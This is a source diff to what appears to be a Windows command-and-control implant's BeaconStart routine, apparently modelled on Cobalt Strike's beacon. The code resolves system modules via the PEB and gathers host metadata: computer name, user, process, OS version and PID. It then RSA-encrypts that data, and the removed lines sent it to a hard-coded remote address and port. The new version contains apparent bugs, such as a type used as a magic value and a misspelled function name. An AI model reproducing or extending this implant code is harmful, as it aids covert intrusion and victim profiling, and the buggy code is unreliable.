@@ -28,7 +28,6 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 	UCHAR           Str[MAX_PATH] = { 0 };
 	PVOID           K32           =   0;
 	PVOID           Ntl           =   0;
-	PVOID           Ptr           =   0;
 
 	K32 = PebGetModule( H_KERNEL32 );
 	Ntl = PebGetModule( H_NTDLL );
@@ -140,14 +139,9 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 				{
 					if ((Ins.BeaconId = RandomNumber32( &Ins )) != 0)
 					{
-						PBEACON_METADATA_HDR Met = 0;
-						PBEACON_METADATA_HDR Hdr = 0;
-						struct sockaddr_in   Sin = { 0 };
-						PVOID                Ecp = 0;
 						PVOID                Cmp = 0;
 						PVOID                Usr = 0;
 						PVOID                Exe = 0;
-						ULONG                Ecl = 0;
 
 						if ((Cmp = BeaconComputer( &Ins )))
 						{
@@ -155,89 +149,111 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 							{
 								if ((Exe = BeaconProcess( &Ins )))
 								{
-									//
-									// Start checking the return value,
-									// and free the old buffer if it
-									// fails.
-									//
+									PBEACON_METADATA_HDR Hdr = 0;
+									PBEACON_METADATA_HDR Buf = 0;
+									PVOID                Ecp = 0;
+									ULONG                Ecl = 0;
 
-									Met = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ) );
-									Met = BufferAddRaw( &Ins, Met, Str, 16 );
-									Met = BufferAddUI2( &Ins, Met, HTONS( Ins.api.GetACP() ) );
-									Met = BufferAddUI2( &Ins, Met, HTONS( Ins.api.GetOEMCP() ) );
-									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.BeaconId ) );
-									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.api.GetCurrentProcessId() ) );
-									Met = BufferAddUI2( &Ins, Met, 0 );
-									
-									//
-									// Instead of manually defining the 
-									// flags, make sure to check if we
-									// are ADMIN or SYSTEM.
-									//
-
-									Met = BufferAddUI1( &Ins, Met, 2 );
-									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion );
-									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion );
-									Met = BufferAddUI2( &Ins, Met, HTONS( NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber ) );
-									Met = BufferAddUI4( &Ins, Met, 0x0 );
-									Met = BufferAddUI4( &Ins, Met, 0x0 );
-									Met = BufferAddUI4( &Ins, Met, 0x0 );
-									Met = BufferAddUI4( &Ins, Met, 0x0 );
-									Met = BufferAddRaw( &Ins, Met, Cmp, strlen( Cmp ) );
-									Met = BufferAddUI1( &Ins, Met, '\t' );
-									Met = BufferAddRaw( &Ins, Met, Usr, strlen( Usr ) );
-									Met = BufferAddUI1( &Ins, Met, '\t' );
-
-									//
-									// Fix code to extract ANSI EXE 
-									// name from ProcessParameters.
-									//
-
-									Met = BufferAddUI1( &Ins, Met, 'h'  );
-									Met = BufferAddUI1( &Ins, Met, 'i'  );
-									Met = BufferAddUI1( &Ins, Met, '.'  );
-									Met = BufferAddUI1( &Ins, Met, 'e'  );
-									Met = BufferAddUI1( &Ins, Met, 'x'  );
-									Met = BufferAddUI1( &Ins, Met, 'e'  );
-									Met = BufferAddUI1( &Ins, Met, '\0' );
-
-									if ((Hdr = Ins.api.LocalLock( Met )))
+									do
 									{
-										Hdr->uMagic = BEACON_METADATA_MAGIC;
-										Hdr->Length = Ins.api.LocalSize( Met ) - 8;
-
-										if ( CryptRsaEncrypt( &Ins, Hdr, Hdr->Length + 8, &Ecp, &Ecl ))
+										if ((Hdr = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ))))
 										{
-											//
-											// NOTE:
-											//
-											// Merge connect with init to reduce the
-											// size, and move the sinaddr_in struct.
-											//
+											if (!(Buf = BufferAddRaw( &Ins, Hdr, Str, 16 ))) 
+												break; 
+											else Hdr = Buf;
+											
+											if (!(Buf = BufferAddUI2( &Ins, Hdr, HTONS(Ins.api.GetACP()) ))) 
+												break; 
+											else Hdr = Buf;
+											
+											if (!(Buf = BufferAddUI2( &Ins, Hdr, HTONS(Ins.api.GetOEMCP()) ))) 
+												break;
+											else Hdr = Buf;
 
-											if ( TransportInit( &Ins ) )
+											if (!(Buf = BufferAddUI4( &Ins, Hdr, HTONL(Ins.BeaconId) )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI4( &Ins, Hdr, HTONL(Ins.api.GetCurrentProcessId()) )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI2( &Ins, Hdr, 0 )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI1( &Ins, Hdr, 2 )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI1( &Ins, Hdr, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI1( &Ins, Hdr, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI2( &Ins, Hdr, HTONS(NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber) )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddRaw( &Ins, Hdr, Cmp, strlen(Cmp) )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI1( &Ins, Hdr, '\t' )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddRaw( &Ins, Hdr, Usr, strlen(Usr) )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI1( &Ins, Hdr, '\t' )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddRaw( &Ins, Hdr, Exe, strlen(Exe) )))
+												break;
+											else Hdr = Buf;
+
+											if (!(Buf = BufferAddUI1( &Ins, Hdr, '\0' )))
+												break;
+											else Hdr = Buf;
+
+											if ((Buf = Ins.api.LocalLock( Hdr )))
 											{
-												Sin.sin_family      = AF_INET;
-												Sin.sin_port        = 0x4242;
-												Sin.sin_addr.s_addr = 0x43434343;
+												Buf->uMagic = BEACON_METADATA_HDR;
+												Buf->Length = Ins.api.LocalSize( Hdr ) - 8;
 
-												if ( TransportConnect( &Ins, Sin ) )
+												if ( CryptRsaEncryt( &Ins, Buf, Buf->Length + 8, &Ecp, &Ecl ) )
 												{
-													if ( TransportSend( &Ins, Ecp, Ecl ) )
-													{
-
-													};
+													Ins.api.LocalFree( Ecp );
 												};
-												TransportFree( &Ins );
+												Ins.api.LocalUnlock( Hdr );
 											};
-											Ins.api.LocalFree( Ecp );
 										};
-										Ins.api.LocalUnlock( Met );
-									};
-									Ins.api.LocalFree( Exe );
+									} while ( 0 );
 
-									// MOVE THIS
-									Ins.api.LocalFree( Met );
+									Ins.api.LocalFree( Hdr );
+									Ins.api.LocalFree( Exe );
 								};
 								Ins.api.LocalFree( Usr );
 							};
@@ -249,12 +265,6 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 			};
 			Ins.api.LocalFree( Ins.key[0].Ptr );
 		};
-
-		//
-		// If we are active, start the IO loop.
-		// Need the AES functions finished, as
-		// well as the HMAC code.
-		//
 
 		if ( Ins.Module[2] != NULL )
 			Ins.api.FreeLibrary( Ins.Module[2] );
